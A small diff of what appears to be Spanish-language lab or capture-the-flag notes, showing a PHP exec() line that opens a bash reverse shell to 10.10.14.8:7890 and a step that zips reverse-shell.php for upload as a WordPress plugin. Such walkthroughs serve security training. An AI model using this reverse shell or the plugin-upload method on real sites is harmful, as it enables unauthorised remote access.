@@ -179,3 +179,6 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.8/7890 0>&1'");
 ahora con zip vamos a transformar nuestro archivo reverse-shell.php a un archivo zip para poder cargarlo al wordpress
 ![[Pasted image 20240823133254.png]]
 
+`Add New Plugin`
+
+![[Pasted image 20240823133503.png]]
